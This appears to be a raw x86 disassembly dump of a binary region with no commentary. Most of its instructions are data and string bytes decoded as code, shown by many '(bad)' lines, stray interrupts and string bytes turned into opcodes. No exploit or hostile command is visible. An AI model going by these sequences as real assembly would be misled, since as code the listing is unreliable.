  427a03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a04:	dec    esp
  427a05:	cmp    edx,DWORD PTR [ecx]
  427a07:	cmp    esp,ebx
  427a09:	das    
  427a0a:	inc    ebp
  427a0b:	sti    
  427a0c:	xchg   edx,eax
  427a0d:	shr    ecx,cl
  427a0f:	sub    BYTE PTR [edx],dl
  427a11:	clc    
  427a12:	add    BYTE PTR [eax-0x102c9380],0x92
  427a19:	cmp    ebx,ebp
  427a1b:	push   ebx
  427a1c:	clc    
  427a1d:	int    0xe6
  427a1f:	mov    BYTE PTR [ebx-0x2b],dl
  427a22:	int    0xa6
  427a24:	dec    esp
  427a25:	xchg   ecx,ebx
  427a27:	sbb    esi,esp
  427a29:	or     dl,BYTE PTR [esi+0x4cd60a88]
  427a2f:	int    0x96
  427a31:	mov    ch,cl
  427a33:	(bad)  
  427a34:	dec    esp
  427a35:	int    0xe6
  427a37:	mov    ch,cl
  427a39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a3a:	dec    esp
  427a3b:	cmp    edx,DWORD PTR [ecx]
  427a3d:	cmp    esp,ebx
  427a3f:	das    
  427a40:	inc    ebp
  427a41:	sti    
  427a42:	xchg   edx,eax
  427a43:	shr    ecx,cl
  427a45:	sub    BYTE PTR [ebx],bh
  427a47:	fst    st(3)
  427a49:	out    dx,eax
  427a4a:	xchg   edx,eax
  427a4b:	adc    bh,al
  427a4d:	add    BYTE PTR [eax-0x2aac9380],0x53
  427a54:	clc    
  427a55:	ds xchg esi,eax
  427a57:	xor    BYTE PTR [esi],bl
  427a59:	(bad)  
  427a5a:	adc    al,0xcd
  427a5c:	xchg   esi,eax
  427a5d:	cmp    al,0xcd
  427a5f:	(bad)  
  427a60:	inc    esp
  427a61:	int    0x96
  427a63:	xor    ch,cl
  427a65:	(bad)  
  427a66:	adc    al,0xcd
  427a68:	xchg   esi,eax
  427a69:	xor    ch,cl
  427a6b:	(bad)  
  427a6c:	adc    al,0xcd
  427a6e:	out    0x30,al
  427a70:	int    0xa6
  427a72:	adc    al,0x3b
  427a74:	adc    DWORD PTR [ebx],edi
  427a76:	jecxz  0x427aa7
  427a78:	inc    ebp
  427a79:	sti    
  427a7a:	xchg   edx,eax
  427a7b:	shr    ecx,cl
  427a7d:	sub    BYTE PTR [ebx],bh
  427a7f:	fst    QWORD PTR [edx]
  427a81:	clc    
  427a82:	add    BYTE PTR [eax-0x102c9380],0x92
  427a89:	push   ebx
  427a8a:	clc    
  427a8b:	int    0xe6
  427a8d:	cmp    al,0x53
  427a8f:	aad    0xcd
  427a91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a92:	inc    esp
  427a93:	cmp    edi,edx
  427a95:	cmp    ebx,DWORD PTR [ebp-0x32c38933]
  427a9b:	lea    eax,[edi+ebp*1+0x45]
  427a9f:	loope  0x427a33
  427aa1:	cmp    ecx,ebx
  427aa3:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427aa9:	sub    BYTE PTR [ebx+edx*2-0x6],0xcd
  427aae:	lea    esi,[eax]
  427ab0:	shr    esp,cl
  427ab2:	xchg   edx,eax
  427ab3:	push   ebx
  427ab4:	popf   
  427ab5:	xchg   ecx,ebx
  427ab7:	int    0x96
  427ab9:	adc    al,0x1b
  427abb:	hlt    
  427abc:	add    al,0xf2
  427abe:	std    
  427abf:	shr    edi,cl
  427ac1:	sub    BYTE PTR [ebx],bh
  427ac3:	ins    DWORD PTR es:[edi],dx
  427ac4:	adc    al,BYTE PTR [edx]
  427ac6:	aam    0x37
  427ac8:	ficom  WORD PTR [ebx]
  427aca:	adc    bh,bl
  427acc:	mov    ebp,0xcd25230a
  427ad1:	out    0x3c,al
  427ad3:	int    0xa6
  427ad5:	inc    esp
  427ad6:	add    al,0xe9
  427ad8:	std    
  427ad9:	adc    bh,al
  427adb:	aam    0x37
  427add:	ficom  WORD PTR [ebx]
  427adf:	adc    dh,ah
  427ae1:	mov    ebp,0x8725230a
  427ae6:	lock int 0xe6
  427ae9:	and    al,0x1b
  427aeb:	aad    0x53
  427aed:	rcl    BYTE PTR [esi-0x43],cl
  427af0:	or     ah,BYTE PTR [ebx]
  427af2:	and    eax,0x12025370
  427af7:	not    esi
  427af9:	aaa    
  427afa:	ficom  WORD PTR [ebx]
  427afc:	cwde   
  427afd:	add    dh,dl
  427aff:	xor    al,0x0
  427b01:	(bad)  
  427b02:	sub    al,0x9a
  427b04:	add    dh,dl
  427b06:	sbb    al,0x0
  427b08:	(bad)  
  427b09:	adc    al,0x0
  427b0b:	(bad)  
  427b0c:	xor    BYTE PTR [eax],al
  427b0e:	(bad)  
  427b0f:	dec    esp
  427b10:	add    dh,dl
  427b12:	mov    BYTE PTR [ebp+0xfef4],bh
  427b18:	or     cl,BYTE PTR [ebx-0x57557433]
  427b1e:	arpl   bx,cx
  427b20:	sar    BYTE PTR [eax+eax*4],cl
  427b23:	int    0x96
  427b25:	mov    ch,cl
  427b27:	(bad)  
  427b28:	dec    esp
  427b29:	int    0xe6
  427b2b:	mov    ch,cl
  427b2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b2e:	dec    esp
  427b2f:	cmp    esp,ebx
  427b31:	cmp    edx,DWORD PTR [ecx]
  427b33:	das    
  427b34:	inc    ebp
  427b35:	sti    
  427b36:	xchg   edx,eax
  427b37:	shr    ecx,cl
  427b39:	sub    BYTE PTR [edx],dl
  427b3b:	clc    
  427b3c:	add    BYTE PTR [eax-0x102c9380],0x92
  427b43:	cmp    ebx,ebp
  427b45:	push   ebx
  427b46:	aad    0x53
  427b48:	clc    
  427b49:	int    0xe6
  427b4b:	xor    ch,cl
  427b4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b4e:	adc    al,0x53
  427b50:	fst    DWORD PTR [ebx-0xc]
  427b53:	or     dl,BYTE PTR [esi+0x14d60a30]
  427b59:	int    0x96
  427b5b:	cmp    al,0xcd
  427b5d:	(bad)  
  427b5e:	inc    esp
  427b5f:	int    0x96
  427b61:	xor    ch,cl
  427b63:	(bad)  
  427b64:	adc    al,0xcd
  427b66:	xchg   esi,eax
  427b67:	mov    ch,cl
  427b69:	(bad)  
  427b6a:	dec    esp
  427b6b:	int    0x96
  427b6d:	mov    ch,cl
  427b6f:	(bad)  
  427b70:	dec    esp
  427b71:	int    0xe6
  427b73:	mov    ch,cl
  427b75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b76:	dec    esp
  427b77:	cmp    esp,ebx
  427b79:	cmp    edx,DWORD PTR [ecx]
  427b7b:	das    
  427b7c:	inc    ebp
  427b7d:	sti    
  427b7e:	xchg   edx,eax
  427b7f:	shr    ecx,cl
  427b81:	sub    BYTE PTR [edx],dl
  427b83:	clc    
  427b84:	add    BYTE PTR [eax-0x22c49380],0x53
  427b8b:	aad    0xd3
  427b8d:	out    dx,eax
  427b8e:	xchg   edx,eax
  427b8f:	push   ebx
  427b90:	clc    
  427b91:	int    0xe6
  427b93:	xor    ch,cl
  427b95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b96:	adc    al,0x3b
  427b98:	cli    
  427b99:	cmp    ebx,DWORD PTR [ebp-0x32cf8933]
  427b9f:	lea    edx,[edi+ebp*1]
  427ba2:	inc    ebp
  427ba3:	loope  0x427b37
  427ba5:	cmp    ecx,ebx
  427ba7:	push   ebx
  427ba8:	cli    
  427ba9:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427baf:	sub    BYTE PTR [ebx+edx*8-0x14],0x92
  427bb4:	push   ebx
  427bb5:	popf   
  427bb6:	int    0x76
  427bb8:	cmp    al,0xcd
  427bba:	lea    eax,[edi+eax*4-0x27]
  427bbe:	int    0xe6
  427bc0:	cmp    al,0x1b
  427bc2:	hlt    
  427bc3:	int    0xa6
  427bc5:	inc    esp
  427bc6:	adc    al,BYTE PTR [edx]
  427bc8:	mov    ebp,0x5625230a
  427bcd:	jnp    0x427c06
  427bcf:	ficom  WORD PTR [ebx]
  427bd1:	das    
  427bd2:	inc    ebp
  427bd3:	jge    0x427b67
  427bd5:	shr    ecx,cl
  427bd7:	sub    bl,dl
  427bd9:	jmp    0x427b6d
  427bdb:	cmp    ebx,ebp
  427bdd:	adc    bh,al
  427bdf:	add    BYTE PTR [eax-0xfac9380],0x53
  427be6:	lds    eax,FWORD PTR [edi-0x32fde40f]
  427bec:	lea    ecx,[eax-0x32b36933]
  427bf2:	out    0x30,al
  427bf4:	int    0xa6
  427bf6:	adc    al,0x4
  427bf8:	repnz std 
  427bfa:	add    al,0xe9
  427bfc:	std    
  427bfd:	adc    al,BYTE PTR [edx]
  427bff:	aam    0x37
  427c01:	ficom  WORD PTR [ebx]
  427c03:	adc    bh,al
  427c05:	aam    0x37
  427c07:	ficom  WORD PTR [ebx]
  427c09:	shr    edi,cl
  427c0b:	sub    BYTE PTR [ebx],bh
  427c0d:	ins    DWORD PTR es:[edi],dx
  427c0e:	adc    bh,bl
  427c10:	mov    ebp,0x1225230a
  427c15:	hlt    
  427c16:	mov    ebp,0x8725230a
  427c1b:	lock sbb edx,ebp
  427c1e:	jmp    0x427c67
  427c20:	inc    DWORD PTR [eax]
  427c22:	add    BYTE PTR [esi-0x12fb1233],dl
  427c28:	sbb    al,0x98
  427c2a:	pop    edi
  427c2b:	(bad)  
  427c2c:	aaa    
  427c2d:	ficom  WORD PTR [ebx]
  427c2f:	or     cl,BYTE PTR [ebp+0xabd5d11]
  427c35:	and    esp,DWORD PTR ds:0xc9f5760a
  427c3b:	jbe    0x427bfa
  427c3d:	xchg   ecx,eax
  427c3e:	aaa    
  427c3f:	ficom  WORD PTR [ebx]
  427c41:	or     dh,BYTE PTR [esi-0x13]
  427c44:	int    0x96
  427c46:	adc    ebp,ecx
  427c48:	(bad)  
  427c49:	cmc    
  427c4a:	call   0xefd3:0x92fb452f
  427c51:	xchg   edx,eax
  427c52:	int    0xd6
  427c54:	adc    ebp,ecx
  427c56:	out    0xf5,al
  427c58:	jo     0x427c6c
  427c5a:	sti    
  427c5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c5c:	mov    esi,0x3b4229
  427c61:	jno    0x427cb6
  427c63:	(bad)  [edx]
  427c65:	xchg   esi,eax
  427c66:	std    
  427c67:	int    0x96
  427c69:	dec    esp
  427c6a:	or     dl,BYTE PTR [esi+0x4cd6004c]
  427c70:	iret   
  427c71:	jbe    0x427c70
  427c73:	add    dh,dl
  427c75:	mov    bl,dl
  427c77:	mov    ecx,0xd6007028
  427c7c:	dec    esp
  427c7d:	add    dh,dl
  427c7f:	in     eax,dx
  427c80:	add    dh,dl
  427c82:	mov    ebp,0xf5d600
  427c87:	(bad)  
  427c88:	adc    DWORD PTR [ebp+0xfde6],edi
  427c8e:	stos   BYTE PTR es:[edi],al
  427c8f:	or     dh,BYTE PTR [esi-0x3]
  427c92:	int    0x76
  427c94:	std    
  427c95:	test   al,0xcb
  427c97:	ror    BYTE PTR [eax-0x12326980],cl
  427c9d:	add    al,0xb5
  427c9f:	stc    
  427ca0:	add    al,0xed
  427ca2:	inc    esp
  427ca3:	cwde   
  427ca4:	leave  
  427ca5:	je     0x427cdb
  427ca7:	xor    al,0x80
  427ca9:	add    BYTE PTR [eax+0x3474c980],0x44
  427cb0:	add    BYTE PTR [eax+0x74cf8080],0x34
  427cb7:	xor    BYTE PTR [eax+0x0],dh
  427cba:	(bad)  
  427cbb:	xor    al,0x0
  427cbd:	(bad)  
  427cbe:	sub    al,0x0
  427cc0:	(bad)  
  427cc1:	and    al,0x0
  427cc3:	(bad)  
  427cc4:	sbb    al,0x0
  427cc6:	(bad)  
  427cc7:	adc    al,0x0
  427cc9:	(bad)  
  427cca:	xor    BYTE PTR [eax],al
  427ccc:	(bad)  
  427ccd:	dec    esp
  427cce:	add    dh,dl
  427cd0:	mov    BYTE PTR [ebp+0xe7e7],bh
  427cd6:	int    0x76
  427cd8:	mov    BYTE PTR [edx],cl
  427cda:	je     0x427d10
  427cdc:	test   ch,cl
  427cde:	je     0x427d14
  427ce0:	xor    al,0x6
  427ce2:	ins    DWORD PTR es:[edi],dx
  427ce3:	das    
  427ce4:	add    eax,0x80808017
  427ce9:	int    0x74
  427ceb:	xor    al,0x44
  427ced:	push   es
  427cee:	ins    DWORD PTR es:[edi],dx
  427cef:	das    
  427cf0:	add    eax,0x8080800a
  427cf5:	add    ah,dl
  427cf7:	xor    al,0x24
  427cf9:	add    ah,dl
  427cfb:	xor    al,0x24
  427cfd:	add    ah,dl
  427cff:	xor    al,0x24
  427d01:	int    0x74
  427d03:	xor    al,0x50
  427d05:	add    cl,dh
  427d07:	int    0x74
  427d09:	xor    al,0x84
  427d0b:	int    0x74
  427d0d:	xor    al,0x84
  427d0f:	int    0x74
  427d11:	xor    al,0x84
  427d13:	iret   
  427d14:	jbe    0x427c9a
  427d16:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427d1a:	int    0x74
  427d1c:	xor    al,0x3c
  427d1e:	xchg   DWORD PTR [esp+esi*1-0x7c],esi
  427d22:	or     dh,BYTE PTR [esp+esi*1-0x7c]
  427d26:	int    0x74
  427d28:	xor    al,0x84
  427d2a:	int    0x74
  427d2c:	xor    al,0x84
  427d2e:	int    0x8c
  427d30:	xor    al,0x84
  427d32:	int    0xa
  427d34:	and    eax,0xcd808081
  427d39:	xor    ebp,ecx
  427d3b:	aam    0x34
  427d3d:	mov    ch,cl
  427d3f:	add    DWORD PTR ds:0x5e808081,ebp
  427d45:	sbb    BYTE PTR [edi],ch
  427d47:	or     edx,DWORD PTR ds:0xcd808081
  427d4d:	xor    ch,cl
  427d4f:	push   eax
  427d50:	int    0x62
  427d52:	fs iret 
  427d54:	xchg   esp,eax
  427d55:	sbb    BYTE PTR [eax-0x33],dh
  427d58:	push   ecx
  427d59:	int    0x22
  427d5b:	xchg   DWORD PTR [ecx-0x77cb2b33],ebx
  427d61:	pop    esi
  427d62:	sbb    BYTE PTR [edi],ch
  427d64:	add    al,0x7b
  427d66:	add    DWORD PTR [eax+0x3494cd80],0xcd51cd88
  427d70:	dec    edx
  427d71:	int    0x80
  427d73:	xor    ecx,DWORD PTR [edi]
  427d75:	xchg   ebx,edx
  427d77:	or     dl,BYTE PTR [edx-0x7f7e8d15]
  427d7d:	or     ch,0x74
  427d80:	xor    al,0x44
  427d82:	push   es
  427d83:	ins    DWORD PTR es:[edi],dx
  427d84:	das    
  427d85:	push   es
  427d86:	cwde   
  427d87:	add    DWORD PTR [eax+0x3474cd80],0x2d01cd84
  427d91:	add    DWORD PTR [eax+0xa80cd80],0xcd4c3474
  427d9b:	je     0x427dd1
  427d9d:	test   ch,cl
  427d9f:	add    DWORD PTR ds:0xcd808081,esp
  427da5:	or     BYTE PTR [edx],0x74
  427da8:	xor    al,0x4c
  427daa:	int    0x74
  427dac:	xor    al,0x84
  427dae:	int    0x1
  427db0:	or     DWORD PTR [ecx-0x7f327f80],eax
  427db6:	int    0x80
  427db8:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427dbc:	int    0x74
  427dbe:	xor    al,0x84
  427dc0:	int    0x1
  427dc2:	int3   
  427dc3:	add    DWORD PTR [eax-0x327f3280],0x34740a80
  427dcd:	dec    esp
  427dce:	int    0x74
  427dd0:	xor    al,0x84
  427dd2:	int    0x8c
  427dd4:	xor    al,0x84
  427dd6:	int    0x1
  427dd8:	popf   
  427dd9:	add    DWORD PTR [eax-0x62f53280],0xcd808081
  427de3:	or     ch,0x89
  427de6:	imul   edx,ecx,0x3b358621
  427dec:	jns    0x427df2
  427dee:	add    bh,bh
  427df0:	sar    DWORD PTR [ebp+0x28f2d392],cl
  427df6:	push   ebx
  427df7:	jge    0x427e03
  427df9:	mov    WORD PTR [esp+ecx*2],?
  427dfc:	leave  
  427dfd:	je     0x427e33
  427dff:	mov    BYTE PTR [eax-0x327f7f80],al
  427e05:	je     0x427e3b
  427e07:	xor    al,0x6
  427e09:	ins    DWORD PTR es:[edi],dx
  427e0a:	aam    0x73
  427e0c:	int    0x74
  427e0e:	xor    al,0x30
  427e10:	add    al,0xbd
  427e12:	adc    ah,0x52
  427e15:	jl     0x427deb
  427e17:	cmp    edi,DWORD PTR [esp+edi*2-0x2c]
  427e1b:	and    edi,DWORD PTR [esi+edx*8+0x52]
  427e1f:	add    ah,dl
  427e21:	xor    al,0x2c
  427e23:	add    ah,dl
  427e25:	xor    al,0x2c
  427e27:	add    ah,dl
  427e29:	xor    al,0x2c
  427e2b:	add    ah,dl
  427e2d:	xor    al,0x2c
  427e2f:	int    0x74
  427e31:	xor    al,0x54
  427e33:	add    cl,dh
  427e35:	in     al,dx
  427e36:	cmp    BYTE PTR [eax],al
  427e38:	aam    0x34
  427e3a:	and    al,0x0
  427e3c:	aam    0x34
  427e3e:	and    al,0x0
  427e40:	aam    0x34
  427e42:	and    al,0xcd
  427e44:	je     0x427e7a
  427e46:	push   eax
  427e47:	add    cl,dh
  427e49:	in     al,dx
  427e4a:	and    al,BYTE PTR [eax]
  427e4c:	aam    0x34
  427e4e:	adc    al,0xcd
  427e50:	je     0x427e86
  427e52:	cmp    al,0x0
  427e54:	icebp  
  427e55:	in     al,dx
  427e56:	xchg   ch,cl
  427e58:	je     0x427e8e
  427e5a:	xor    al,0x0
  427e5c:	icebp  
  427e5d:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427e61:	int    0x74
  427e63:	xor    al,0x4c
  427e65:	push   es
  427e66:	ins    DWORD PTR es:[edi],dx
  427e67:	aam    0x4e
  427e69:	int    0x74
  427e6b:	xor    al,0x84
  427e6d:	leave  
  427e6e:	add    DWORD PTR [ebp+0x41808081],ebp
  427e74:	and    DWORD PTR [esi+0x3474cd35],eax
  427e7a:	mov    ch,cl
  427e7c:	mov    WORD PTR [esp+eax*4],?
  427e7f:	int    0xa
  427e81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e82:	add    DWORD PTR [eax-0x367ef580],0x49883474
  427e8c:	and    DWORD PTR [esi+0x3474cd35],eax
  427e92:	mov    ch,cl
  427e94:	mov    WORD PTR [eax+ecx*4],?
  427e97:	cmp    edi,DWORD PTR [ecx+0x4]
  427e9a:	add    bh,bh
  427e9c:	shl    edx,cl
  427e9e:	sub    bl,dl
  427ea0:	mov    ebp,0xcdd35392
  427ea5:	mov    WORD PTR [esp+ecx*2],?
  427ea8:	inc    ebx
  427ea9:	rcl    esi,cl
  427eab:	and    ecx,ebp
  427ead:	je     0x427ee3
  427eaf:	test   ch,cl
  427eb1:	mov    WORD PTR [esp+eax*4],?
  427eb4:	int    0xa
  427eb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427eb7:	add    DWORD PTR [eax-0x32aeff80],0x80811101
  427ec1:	add    BYTE PTR [eax],0x70
  427ec4:	cmp    al,0xec
  427ec6:	push   ds
  427ec7:	iret   
  427ec8:	jbe    0x427e4e
  427eca:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427ece:	int    0x74
  427ed0:	xor    al,0x4c
  427ed2:	int    0x8c
  427ed4:	xor    al,0x84
  427ed6:	int    0xa
  427ed8:	in     al,0x81
  427eda:	add    BYTE PTR [eax-0x777e7633],0xcd
  427ee1:	je     0x427f17
  427ee3:	test   ch,cl
  427ee5:	add    ebp,ebp
  427ee7:	add    DWORD PTR [eax-0x3277ff80],0xcd84348c
  427ef1:	or     bh,BYTE PTR [ebp-0x327f7f7f]
  427ef7:	or     bh,0x84
  427efa:	adc    cl,ch
  427efc:	mov    WORD PTR [esp+eax*4],?
  427eff:	int    0xa
  427f01:	in     al,0x81
  427f03:	add    BYTE PTR [eax-0x76327f33],0x81
  427f0a:	mov    BYTE PTR [eax-0x2d591833],ch
  427f10:	sub    al,0x80
  427f12:	lds    edx,FWORD PTR [eax+0x75]
  427f15:	ins    BYTE PTR es:[edi],dx
  427f16:	jae    0x427f8f
  427f18:	bound  ebp,QWORD PTR gs:[edi+0x6c]
  427f1c:	bound  esp,QWORD PTR fs:[ebp+0x64]
  427f20:	add    BYTE PTR [ecx+0x74],ah
  427f23:	ins    BYTE PTR es:[edi],dx
  427f24:	popa   
  427f25:	inc    esp
  427f26:	gs popa 
  427f28:	fs push 0x6561686d
  427f2e:	add    BYTE PTR fs:[ebp+0x74],ah
  427f32:	push   0x65726143
  427f37:	outs   dx,DWORD PTR ds:[esi]
  427f38:	jns    0x427fa0
  427f3a:	add    BYTE PTR gs:[edi+0x72],dh
  427f3e:	jns    0x427fad
  427f40:	popa   
  427f41:	outs   dx,DWORD PTR ds:[esi]
  427f42:	bound  ebp,QWORD PTR gs:[ecx+0x74]
  427f46:	add    BYTE PTR [edi+ebp*2+0x73],dh
  427f4a:	push   0x6f6d6568
  427f4f:	add    BYTE PTR fs:[edx+0x65],dl
  427f53:	arpl   WORD PTR [ebx+0x62],si
  427f56:	popa   
  427f57:	ins    BYTE PTR es:[edi],dx
  427f58:	jne    0x427fd2
  427f5a:	gs jae 0x427f5d
  427f5d:	ins    DWORD PTR es:[edi],dx
  427f5e:	imul   edi,DWORD PTR [eax+0x50],0x64726569
  427f65:	outs   dx,DWORD PTR ds:[esi]
  427f66:	jb     0x427fd7
  427f68:	jo     0x427f6a
  427f6a:	ja     0x427fcd
  427f6c:	gs je  0x427fde
  427f6f:	jb     0x427fe0
  427f71:	bound  esp,QWORD PTR [ecx+0x70]
  427f74:	add    BYTE PTR [ebx+0x69],cl
  427f77:	outs   dx,BYTE PTR ds:[esi]
  427f78:	addr16 addr16 popa 
  427f7b:	outs   dx,BYTE PTR ds:[esi]
  427f7c:	arpl   WORD PTR [ecx+0x70],sp
  427f7f:	add    BYTE PTR [edi+0x6e],al
  427f82:	jne    0x427ff7
  427f84:	je     0x427feb
  427f86:	outs   dx,BYTE PTR ds:[esi]
  427f87:	push   esi
  427f88:	popa   
  427f89:	jb     0x428004
  427f8b:	add    BYTE PTR [ebx+esi*2+0x61],dl
  427f8f:	jb     0x427fe1
  427f91:	popa   
  427f92:	ins    BYTE PTR es:[edi],dx
  427f93:	ins    DWORD PTR es:[edi],dx
  427f94:	je     0x427fff
  427f96:	outs   dx,DWORD PTR ds:[esi]
  427f97:	ja     0x427ffe
  427f99:	jb     0x427f9b
  427f9b:	jo     0x428002
  427f9d:	ins    DWORD PTR es:[edi],dx
  427f9e:	jns    0x428014
  427fa0:	push   0x6f656562
  427fa5:	outs   dx,BYTE PTR ds:[esi]
  427fa6:	push   eax
  427fa7:	imul   esi,DWORD PTR [eax+0x79],0x786f6200
  427fae:	inc    ebx
  427faf:	outs   dx,DWORD PTR ds:[esi]
  427fb0:	popa   
  427fb1:	ins    BYTE PTR es:[edi],dx
  427fb2:	popa   
  427fb3:	imul   ebp,DWORD PTR [eax+0x65],0x656573
  427fba:	je     0x428035
  427fbc:	outs   dx,DWORD PTR gs:[esi]
  427fbe:	outs   dx,BYTE PTR ds:[esi]
  427fbf:	gs ins BYTE PTR es:[edi],dx
  427fc1:	inc    ebx
  427fc2:	push   0x54007261
  427fc7:	jns    0x428039
  427fc9:	jns    0x428038
  427fcb:	jne    0x428032
  427fcd:	imul   eax,DWORD PTR gs:[eax],0x70
  427fd1:	outs   dx,DWORD PTR ds:[esi]
  427fd2:	je     0x428016
  427fd4:	gs gs jb 0x428048
  427fd8:	outs   dx,DWORD PTR ds:[esi]
  427fd9:	je     0x428046
  427fdb:	imul   eax,DWORD PTR [eax],0x616c7548
  427fe1:	jo     0x42804c
  427fe3:	popa   
  427fe4:	ins    BYTE PTR es:[edi],dx
  427fe5:	dec    ebx
  427fe6:	outs   dx,BYTE PTR ds:[esi]
  427fe7:	popa   
  427fe8:	jo     0x428063
  427fea:	add    BYTE PTR gs:[eax+0x6f],dh
  427fee:	je     0x428032
  427ff0:	gs ins BYTE PTR es:[edi],dx
  427ff2:	jae    0x428063
  427ff4:	js     0x427ff6
  427ff6:	popa   
  427ff7:	data16 je 0x428040
  427ffa:	ins    BYTE PTR es:[edi],dx
  427ffb:	popa   
  427ffc:	imul   esp,DWORD PTR [ebp+0x78],0x70
  428000:	gs jae 0x428064
  428003:	jb     0x428005
  428005:	inc    edx
  428006:	ins    BYTE PTR es:[edi],dx
  428007:	popa   
  428008:	bound  eax,QWORD PTR [ecx+ebp*2+0x6e]
  42800c:	je     0x428074
  42800e:	ins    BYTE PTR es:[edi],dx
  42800f:	jns    0x428086
  428011:	push   0x6d6d6800
  428016:	popa   
  428017:	inc    edi
  428018:	popa   
  428019:	ins    BYTE PTR es:[edi],dx
  42801a:	ins    BYTE PTR es:[edi],dx
  42801b:	push   0x48007361
  428020:	outs   dx,DWORD PTR ds:[esi]
  428021:	ins    DWORD PTR es:[edi],dx
  428022:	outs   dx,DWORD PTR gs:[esi]
  428024:	jb     0x42808b
  428026:	data16 jno 0x428092
  428029:	jae    0x42808c
  42802b:	bound  esi,QWORD PTR [eax+0x61]
  42802e:	add    BYTE PTR [ebp+0x74],ah
  428031:	outs   dx,BYTE PTR ds:[esi]
  428032:	gs addr16 jbe 0x428097
  428036:	je     0x4280b1
  428038:	gs popa 
  42803a:	add    BYTE PTR [ebp+0x67],ah
  42803d:	outs   dx,DWORD PTR ds:[esi]
  42803e:	inc    edi
  42803f:	popa   
  428040:	imul   esi,DWORD PTR [ecx+eiz*2+0x72],0x6f00656f
  428048:	jo     0x4280af
  42804a:	fs jbe 0x4280ae
  42804d:	je     0x4280c4
  42804f:	imul   ebp,DWORD PTR [ecx+0x66],0x62
  428053:	outs   dx,DWORD PTR ds:[esi]
  428054:	add    BYTE PTR [edx+0x0],ch
  428057:	jne    0x428059
  428059:	add    BYTE PTR [bp+0x0],ch
  42805d:	popa   
  42805e:	add    BYTE PTR [esi+0x0],ch
  428061:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  428066:	add    BYTE PTR [ebp+0x0],dh
  428069:	ins    DWORD PTR es:[edi],dx
  42806a:	add    BYTE PTR [eax],al
  42806c:	add    BYTE PTR [edi+0x0],ch
  42806f:	jb     0x428071
  428071:	ja     0x428073
  428073:	imul   eax,DWORD PTR [eax],0x680073
  428079:	outs   dx,BYTE PTR ds:[esi]
  42807a:	add    BYTE PTR [ecx+0x0],ch
  42807d:	add    BYTE PTR fs:[ecx+0x0],ch
  428081:	ja     0x428083
  428083:	imul   eax,DWORD PTR [eax],0x65006e
  428089:	push   0x70000000
  42808e:	add    BYTE PTR [ecx+0x0],ah
  428091:	je     0x428093
  428093:	jbe    0x428095
  428095:	add    BYTE PTR gs:[ebp+0x0],ah
  428099:	je     0x42809b
  42809b:	add    BYTE PTR gs:[edi+0x0],ah
  42809f:	ins    BYTE PTR es:[edi],dx
  4280a0:	add    BYTE PTR [ecx+0x0],ah
  4280a3:	imul   eax,DWORD PTR [eax],0x66
  4280a9:	outs   dx,DWORD PTR ds:[esi]
  4280aa:	add    BYTE PTR [esi+0x0],ch
  4280ad:	je     0x4280af
  4280af:	popa   
  4280b0:	add    BYTE PTR [edi+0x0],dh
  4280b3:	push   ebx
  4280b4:	add    BYTE PTR [edi+0x0],ch
  4280b7:	arpl   WORD PTR [eax],ax
  4280b9:	imul   eax,DWORD PTR [eax],0x61
  4280bc:	add    BYTE PTR [esi+0x0],dh
  4280bf:	outs   dx,DWORD PTR ds:[esi]
  4280c0:	add    BYTE PTR [eax],al
  4280c2:	add    BYTE PTR [ebp+0x0],ch
  4280c5:	jns    0x4280c7
  4280c7:	add    BYTE PTR gs:[esi+0x0],ah
  4280cb:	ins    BYTE PTR es:[edi],dx
  4280cc:	add    BYTE PTR [ecx+0x0],ah
  4280cf:	jns    0x4280d1
  4280d1:	jbe    0x4280d3
  4280d3:	popa   
  4280d4:	add    BYTE PTR [esi+0x0],ch
  4280d7:	popa   
  4280d8:	add    BYTE PTR [edi+0x0],ah
  4280db:	outs   dx,DWORD PTR ds:[esi]
  4280dc:	add    BYTE PTR [eax],al
  4280de:	add    BYTE PTR [edi+0x0],ch
  4280e1:	jb     0x4280e3
  4280e3:	jae    0x4280e5
  4280e5:	imul   eax,DWORD PTR [eax],0x47006e
  4280eb:	imul   eax,DWORD PTR [eax],0x70006d
  4280f1:	bound  eax,QWORD PTR [eax]
  4280f3:	outs   dx,DWORD PTR ds:[esi]
  4280f4:	add    BYTE PTR [eax+0x0],dh
  4280f7:	imul   eax,DWORD PTR [eax],0x650000
  4280fd:	js     0x4280ff
  4280ff:	jae    0x428101
  428101:	outs   dx,DWORD PTR ds:[esi]
  428102:	add    BYTE PTR [ebx+0x0],dh
  428105:	popa   
  428106:	add    BYTE PTR [esi+0x0],ch
  428109:	je     0x42810b
  42810b:	add    BYTE PTR [eax],al
  42810d:	bound  eax,QWORD PTR [eax]
  42810f:	jns    0x428111
  428111:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  428116:	add    BYTE PTR [eax+eax*1+0x74],ah
  42811a:	add    BYTE PTR [ecx+0x0],ah
  42811d:	add    BYTE PTR [eax],al
  42811f:	js     0x428121
  428121:	imul   eax,DWORD PTR [eax],0x610054
  428127:	imul   eax,DWORD PTR [eax],0x48006e
  42812d:	popa   
  42812e:	add    BYTE PTR [esi+0x0],ch
  428131:	add    BYTE PTR fs:[eax],al
  428134:	add    BYTE PTR [edi+0x0],cl
  428137:	ja     0x428139
  428139:	ins    BYTE PTR es:[edi],dx
  42813a:	add    BYTE PTR [ebx+0x0],dh
  42813d:	popa   
  42813e:	add    BYTE PTR [ebx+0x0],dh
  428141:	jo     0x428143
  428143:	popa   
  428144:	add    BYTE PTR [ecx+0x0],ch
  428147:	imul   eax,DWORD PTR [eax],0x72
  42814a:	add    BYTE PTR [ebp+0x0],ah
  42814d:	jbe    0x42814f
